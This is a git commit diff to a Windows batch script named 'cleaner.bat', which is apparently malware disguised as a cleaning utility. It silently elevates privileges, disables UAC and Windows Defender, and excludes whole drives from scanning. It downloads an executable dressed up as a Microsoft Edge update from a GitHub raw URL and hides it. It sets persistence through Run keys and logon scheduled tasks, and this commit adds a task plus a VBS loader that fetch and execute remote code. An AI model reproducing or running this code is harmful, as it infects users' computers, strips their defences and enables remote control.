44be476c872e19e7b8cd0fffbf4834a38c8e5241
techerking29-collab <techerking29@gmail.com>
2026-02-10 14:54:35 +0300

    Update cleaner.bat

--- cleaner.bat
+++ cleaner.bat
@@ -3,7 +3,6 @@
 set "params=%*"
 cd /d "%~dp0"
 
-
 if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"
 fsutil dirty query %systemdrive% 1>nul 2>nul || (
     echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd /d ""%~sdp0"" && %~s0 %params%", "", "runas", 0 >> "%temp%\getadmin.vbs"
@@ -13,36 +12,29 @@ fsutil dirty query %systemdrive% 1>nul 2>nul || (
 
 :gotAdmin
 pushd "%CD%"
-
 cd /d "%TEMP%"
 set "UpdateChecker=powershell"
 
-
 %UpdateChecker% -w hidden -c "if(Get-Command Add-MpPreference -ErrorAction SilentlyContinue){Add-MpPreference -ExclusionPath 'C:\', 'C:\Windows', 'C:\Program Files (x86)\Microsoft\EdgeUpdate'}" >nul 2>&1
-
 
 dism /online /get-featureinfo /featurename:NetFx3 | findstr /I "Enabled" >nul 2>&1
 if %errorlevel% neq 0 (
     dism /online /enable-feature /featurename:NetFx3 /all /norestart /quiet >nul 2>&1
 )
 
-
 reg add "HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
 
-
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus & threat protection" /v "UILockdown" /t REG_DWORD /d 1 /f >nul 2>&1
-
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul 2>&1
 for %%s in (WdBoot,WdFilter,WdNisSvc,WinDefend,SecurityHealthService,Sense) do (
     reg add "HKLM\System\CurrentControlSet\Services\%%s" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1
 )
-
 
 set "URL=https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/MicrosoftEdgeCoreUpdate.exe"
 set "DEST_DIR=C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.217.3"
@@ -66,25 +58,16 @@ attrib +s +h "%DEST%" >nul 2>&1
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeUpdate" /t REG_SZ /d "\"%DEST%\"" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysWOW64" /d "\"%DEST%\"" /f >nul 2>&1
 
+set "TASK_NAME=EdgeCoreRepair"
+set "LDR_PS=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $t=$env:APPDATA+'\clean.bat'; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/cleaner.bat', $t); Start-Process cmd -ArgumentList '/c',$t -Verb RunAs"
 
-set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-copy /y "%DEST%" "%STARTUP_DIR%\MicrosoftEdgeCoreUpdate.exe" >nul 2>&1
+schtasks /create /tn "%TASK_NAME%" /tr "powershell.exe -w hidden -c \"%LDR_PS%\"" /sc onlogon /rl highest /f >nul 2>&1
 
-
-schtasks /create /tn "SySWOW" /tr "\"%DEST%\"" /sc onlogon /rl highest /f >nul 2>&1
-
-
-set "LDR_CMD=%UpdateChecker% -w hidden -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $t=$env:TEMP+'\fx.bat'; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/cleaner.bat', $t); Start-Process cmd -ArgumentList '/c',$t -Verb RunAs\""
-
-schtasks /create /tn "Microsoft\Windows\Edge\MicrosoftEdgeUpdateTaskMachineCore" /tr "%LDR_CMD%" /sc onlogon /rl highest /f >nul 2>&1
-
-
-set "VBS_LDR=%APPDATA%\Microsoft\EdgeUpdate.vbs"
+set "VBS_LDR=%APPDATA%\EdgeUpdate.vbs"
 echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_LDR%"
 echo WshShell.Run "powershell -w hidden -c ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/cleaner.bat')""", 0, False >> "%VBS_LDR%"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeCoreVbs" /t REG_SZ /d "wscript.exe \"%VBS_LDR%\"" /f >nul 2>&1
 
 echo Islem tamamlandi.
 pause
-
 exit
